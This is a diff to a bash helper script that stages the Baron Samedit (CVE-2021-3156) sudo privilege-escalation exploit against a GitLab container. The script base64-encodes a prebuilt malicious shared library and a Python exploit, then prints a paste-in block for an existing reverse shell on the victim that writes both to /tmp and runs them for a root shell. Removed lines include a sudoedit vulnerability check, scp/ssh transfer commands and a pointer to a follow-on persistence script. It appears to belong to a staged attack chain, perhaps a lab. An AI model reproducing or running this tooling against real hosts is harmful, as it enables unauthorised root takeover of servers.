@@ -1,44 +1,50 @@
 #!/bin/bash
-# Baron Samedit (CVE-2021-3156) privilege escalation
-# Usage: Run this FROM the GitLab container as the 'git' user
-# Typically: transfer exploit files to GitLab, then execute
+# Baron Samedit (CVE-2021-3156) privilege escalation — transfer + run helper
+#
+# Run this ON THE ATTACKER. It emits a single multi-line block of commands
+# that you paste into an existing reverse shell on the victim (running as
+# a non-root user like git). The block drops the pre-built payload .so
+# and the Python exploit into /tmp and runs the exploit.
+#
+# Why pre-built: the victim (GitLab CE) has no gcc. We compile payload_lib.so
+# on the attacker (where gcc is available) and base64-transfer the binary.
 
 set -e
 
-GITLAB_HOST="${1:-172.26.0.30}"
 EXPLOIT_DIR="/opt/exploits/baron-samedit"
+LIB_SRC="$EXPLOIT_DIR/payload_lib.so"
+PY_SRC="$EXPLOIT_DIR/exploit_nss.py"
+REMOTE_LIB="/tmp/libnss_X/P0P_SH3LL.so.2"
+REMOTE_PY="/tmp/exploit_nss.py"
 
-echo "[*] Baron Samedit (CVE-2021-3156) Privilege Escalation"
-echo "[*] This script transfers the exploit to GitLab and runs it"
-echo ""
+if [ ! -f "$LIB_SRC" ]; then
+    echo "[!] Missing $LIB_SRC — build it first:"
+    echo "    cd $EXPLOIT_DIR && gcc -shared -fPIC -nostartfiles -o payload_lib.so payload_lib.c"
+    exit 1
+fi
+if [ ! -f "$PY_SRC" ]; then
+    echo "[!] Missing $PY_SRC"
+    exit 1
+fi
 
-# Step 1: Transfer exploit to GitLab (assumes we have a shell as git user)
-echo "[1/3] Transferring exploit to GitLab..."
+LIB_B64=$(base64 -w0 "$LIB_SRC")
+PY_B64=$(base64 -w0 "$PY_SRC")
 
-# Copy exploit files via the existing reverse shell
-# Using base64 encoding to transfer through the shell
-EXPLOIT_PY=$(base64 -w0 "$EXPLOIT_DIR/exploit_nss.py")
+cat <<EOF
 
-cat <<TRANSFER_EOF
-=== Run these commands in your GitLab reverse shell: ===
+════════════════════════════════════════════════════════════════════
+ Baron Samedit (CVE-2021-3156) — Paste this block into the victim shell
+════════════════════════════════════════════════════════════════════
 
-mkdir -p /tmp/exploit
-echo "$EXPLOIT_PY" | base64 -d > /tmp/exploit/exploit_nss.py
-chmod +x /tmp/exploit/exploit_nss.py
+mkdir -p "\$(dirname ${REMOTE_LIB})"
+echo '${LIB_B64}' | base64 -d > ${REMOTE_LIB}
+echo '${PY_B64}' | base64 -d > ${REMOTE_PY}
+chmod +x ${REMOTE_PY}
+python3 ${REMOTE_PY}
 
-# Test if vulnerable:
-sudoedit -s '\\' 2>/dev/null; echo "Exit code: \$?"
-# Exit code 139 = vulnerable, 1 = patched
+════════════════════════════════════════════════════════════════════
 
-# Run the exploit:
-cd /tmp/exploit && python3 exploit_nss.py
+If the exploit works, the shell will print "[+] ROOT shell obtained!"
+and drop you into a bash prompt as root.
 
-========================================================
-TRANSFER_EOF
-
-echo ""
-echo "[2/3] Alternatively, if you have SSH access as git:"
-echo "      scp $EXPLOIT_DIR/exploit_nss.py git@${GITLAB_HOST}:/tmp/"
-echo "      ssh git@${GITLAB_HOST} 'python3 /tmp/exploit_nss.py'"
-echo ""
-echo "[3/3] After getting root, run 04-persistence.sh for persistence"
+EOF
